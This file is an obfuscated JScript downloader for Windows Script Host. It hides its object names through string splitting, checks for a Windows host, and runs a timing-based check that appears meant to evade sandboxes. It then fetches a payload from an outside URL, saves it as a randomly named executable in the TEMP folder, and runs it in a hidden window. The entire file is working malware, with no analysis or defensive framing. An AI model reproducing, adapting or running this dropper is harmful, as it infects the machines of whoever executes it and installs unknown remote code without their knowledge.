var U1 = false;
var NH = "Create"+"Object";
var D = function UR() {return WScript[NH]("WScript"+".Shell");}(), ZX = 11;
var Z = "MSXML2"+".XMLHTTP";
var SX = 2;
var NT = SX - 2;
function PW(N){D["Run"](N, NT, NT);};
function EC(){return Z + "";};
function YD(ZV, D0){NT = NT * 1; return ZV - D0;};
function R(){return NH;};
/*@cc_on
  @if (@_win32 || @_win64)
    U1 = true;
  @end
@*/
if (U1)
{
var DP = "";
function WS(){return 22;};
var HR0 = 0; var U0 = 0;
function XK()
{
var KD = new this["Date"]();
var HR = KD["getUTCMilliseconds"]();
WScript["Sleep"](WS());
var KD = new this["Date"]();
var V = KD["getUTCMilliseconds"]();
WScript["Sleep"](WS());
var KD = new this["Date"]();
var R0 = KD["getUTCMilliseconds"]();
var HR0 = "RK";
HR0 = YD(V, HR);
var U0 = "WZ";
U0 = YD(R0, V);
DP = "open";
return YD(HR0, U0);
}
var SN = false;
var OL = false;
for (var PY = NT; PY < WS() * 1; PY++){if (XK() != NT){
SN = true; 
U0 = "31" + 11 * HR0 + U0; 
OL = true; 
break;
}}
function OR() {return ((SN == true) && (SN == OL)) ? 1 : NT;};
if (SN && OR() && OL){
function S() {return D["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "YIgtc6MQRySBh9OS.ex" + "e";};
 TB = EC();
 WS0 = WScript[NH](TB);
 var E = 1;
do { 
	for (;E;){
	try {
		if (E == 1)
		{
			WS0[DP]("GET", "http://xn--po-wqa.pl/a8zkde", false);
			WS0["send"]();
			C = "Sleep";
			E = 2;
		}
		WScript[C](WS() + 120); 
		if (WS0["readystate"] < 2 * 2) continue;
		E = NT;
		function U(L) {var KP = (1, 2, 3, 4, 5, L); return KP;};
		F = WScript[R()]("ADODB.Stream");
		TB = F;
		TB[DP]();
		TB["type"] = U(1);
		TB["write"](WS0["ResponseBody"]);
		F["position"] = U(NT);
		TB["Save" + "ToFile"](S(), 2);
		F["cl"+"ose"]();
		GT = S();
		PW(GT);
	} catch(P){};};
}while (E);
}
}

